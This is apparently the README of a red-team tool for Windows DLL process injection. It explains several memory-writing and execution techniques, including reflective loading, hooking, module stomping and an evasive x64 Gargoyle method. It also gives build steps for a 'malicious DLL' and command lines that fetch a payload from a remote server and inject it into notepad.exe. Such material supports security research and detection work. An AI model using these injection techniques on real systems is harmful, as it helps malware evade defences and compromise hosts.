# Modern Process Injection

This tool was originally created during my summer internship at F-Secure in 2021.

This tool provides a number of process injection methods to inject a DLL into processes on 64-bit Windows.

The tool uses a conceptual split between memory writing and execution methods, inspired by Amit Klein and Itzik Kotler's BlackHat 2019 talk: 'Process Injection Techniques - Gotta Catch Them All'.

The current memory writing methods are:

  - `VirtualAllocEx()` and `WriteProcessMemory()`
    - Allocates RWX memory in target process, writes desired data using `WriteProcessMemory()`
    - If writing to already allocated memory, we have full control of what address we write to
  - `NtMapViewOfSection()`
    - Creates a RWX section, maps this section to the injector with RW permissions, writes desired data, and then maps this section to the target process with RX permissions
    - This does not allow us to write to already allocated memory
  - `memset()`
    - Locates an alertable thread in the target process
      - There might not always be an alertable thread in the process. The injector will poll every 0.5 seconds for 10 seconds until giving up.
    - Allocates RWX memory with `VirtualAllocEx()`
    - Queues a number of APCs that call `memset()` to copy a single byte of the payload into the allocated memory
    - Currently not working with gargoyle executor
  

The current execution methods are:

  - `LoadLibraryA()`
    - This requires the DLL is already on disk, and works by writing the path to the DLL in the target process, and starting a thread that calls `LoadLibraryA()` on that path
  - Reflective loading
    - This writes the entire DLL into the target process, and calls into a reflective loader in the DLL that loads itself, avoiding the need for the DLL to be on disk, and registering the library to the process
    - See [Stephen Fewer's PoC](https://github.com/stephenfewer/ReflectiveDLLInjection) for a more in-depth explanation.
  - Reflective hooking
    - This is similar to reflective loading, but hooks a function in the target process to run the reflective loader, which will then unhook the function, preventing the need to create a new thread.
    - This relies on both needing the hooked function to call at some point, and also for us to write to already allocated memory to create our hook.
  - Gargoyle
    - This technique uses a timer and a ROP gadget to execute the payload.
    - The ROP gadget and trampoline call `VirtualProtectEx()` to make the payload RWX, which should then make itself RW after doing some work.
    - See [the original blogpost](https://lospi.net/security/assembly/c/cpp/developing/software/2017/03/04/gargoyle-memory-analysis-evasion.html) for more information
    - More information is available in `GARGOYLE.md`, since the original Gargoyle PoC is only for x86, whereas a custom implementation for x64 was created for this repository.


The --stomp (or -s) option allows for module stomping with execution methods that support it (currently reflective loading and hooking). This means that the injector will load in a module (specified by the argument to --stomp), and overwrite this module with the payload DLL.

## Building

The injector and malicious DLL are intended to be built on Windows, and the server on Linux.

To build the injector:

```
$ cd process_injection
$ mkdir build
$ cd build
$ cmake ..
$ msbuild ALL_BUILD.vcxproj
```

To build the example DLL:

```
$ cd malicious_dll
$ compile.bat
```

In order for the reflective injection and reflective hooking methods to work with this tool, the DLL to be injected must be built with the `reflective_loader.c` file.

To build the server:

```
$ cd server
$ ./compile.sh
```

To build the gargoyle payload (which is also suitable for reflective loading/hooking):

Note that this requires `nasm`.

```
$ cd malicious_dll
$ compile_gargoyle.bat
```

To build the ROP dll that gargoyle can use (see `rop_dll/README.md` for more info):

Note that gargoyle currently by default requires this payload to be located at `C:\rop.dll`, but this can be changed by editing `gargoyle.cpp` before compiling.

```
$ cd rop_dll
$ compile.bat
```



## Usage

The `LoadLibraryA()` executor method requires the DLL is already on disk. The other methods allow both from disk injection (not recommended), and allow you to supply an IP address and port where the `server` is running to download the DLL from.

Example usage to inject `notepad.exe` with `NtMapViewOfSection()` memory writer and reflective loader executor, with server hosted at `192.168.2.1:80`:

```
$ dll_inject.exe --write 1 --exec 1 -h 192.168.2.1 -p 80 --target notepad.exe
```

To inject with module stomping, supply a full path to the module to stomp. For example, to inject `explorer.exe` with `memset()` memory writer and reflective hooker executor, with server hosted at `192.168.2.1:80`, stomping the Windows module `WindowsCodecsRaw.dll`, we would run the following:

```
$ dll_inject.exe -w 2 -e 2 -h 192.168.2.1 -p 80 --stomp C:\Windows\System32\WindowsCodecsRaw.dll -t notepad.exe
```

